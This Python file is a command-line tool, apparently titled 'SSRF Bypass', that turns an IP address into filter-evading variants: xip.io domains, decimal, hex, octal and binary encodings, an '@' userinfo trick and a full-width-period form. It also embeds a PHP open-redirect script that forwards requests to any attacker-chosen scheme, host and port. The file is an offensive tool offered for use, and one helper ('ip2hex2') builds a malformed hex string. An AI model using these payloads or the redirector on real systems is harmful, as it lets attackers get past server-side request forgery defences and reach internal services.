import argparse
import logging

banner = '''
███████╗███████╗██████╗ ███████╗    ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
███████╗███████╗██████╔╝█████╗      ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
╚════██║╚════██║██╔══██╗██╔══╝      ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
███████║███████║██║  ██║██║         ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                                     V1.0
                                                                                Wing
'''

code_302 = '''
<?php  
$schema = $_GET['s'];
$ip     = $_GET['i'];
$port   = $_GET['p'];
$query  = $_GET['q'];
if(empty($port)){  
    header("Location: $schema://$ip/$query"); 
} else {
    header("Location: $schema://$ip:$port/$query"); 
}
'''


def main(args):
    print(banner)
    if args.i:
        ip = args.i
        print(f"[+]正在混淆IP: {args.i}")
        print("\n")
        print(f"[*] xip.io bypass: {ip}.xip.io")
        print(f"[*] xip.io bypass: www.{ip}.xip.io")
        print("\n")
        print(f"[*] 十进制： {addr2dec(ip)}")
        print(f"[*] 十六进制： {ip2hex(ip)}")
        print(f"[*] 十六进制整数： {ip2hex2(ip)}")
        print(f"[*] 八进制： {iptooct(ip)}")
        print(f"[*] 二进制： {ip2bin(ip)}")
        print("\n")
        print("MISC:")
        print(f"@bypass: http://wing.com@{ip}")
        print(f"句号bypass: {ip.replace('.','。')}")
        print(f"ADD PORT: http://{ip}:1314")
    print("***" * 15)
    if args.d:
        print(f"[+]正在混淆域名 {args.d}")
        print("payload还在收集中")


def iptooct(ip):
    return '.'.join(format(int(x), '04o') for x in ip.split('.'))


def ip2hex(ip):
    ip = '.'.join(["0x" + hex(int(x) + 256)[3:] for x in ip.split('.')])
    return ip


def ip2hex2(ip):
    ip = ''.join(["0x" + hex(int(x) + 256)[3:] for x in ip.split('.')])
    return ip


def convert(n):
    a = n.split(".")
    lst = []
    for i in a:
        two = oct(int(i, 10))  # 十进制转换成二进制,并去掉开头的0和b,,(根据需要)
        lst.append(two.zfill(8))  # 十进制添加到列表,不足处用0补位
    return ".".join(lst)  # 把列表用" "连接起来


def dec2oct(num):
    l = []
    if num < 0:
        return '-' + dec2oct(abs(num))
    while True:
        num, remainder = divmod(num, 8)
        l.append(str(remainder))
        if num == 0:
            return ''.join(l[::-1])


def ip2bin(ip):
    octets = map(int, ip.split('/')[0].split('.'))  # '1.2.3.4'=>[1, 2, 3, 4]
    binary = '{0:08b}{1:08b}{2:08b}{3:08b}'.format(*octets)
    range = int(ip.split('/')[1]) if '/' in ip else None
    return binary[:range] if range else binary


def addr2dec(addr):
    "将点分十进制IP地址转换成十进制整数"
    items = [int(x) for x in addr.split(".")]
    return sum([items[i] << [24, 16, 8, 0][i] for i in range(4)])


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", help="指定ip")
    parser.add_argument("-d", help="指定域名")
    args = parser.parse_args()
    main(args)
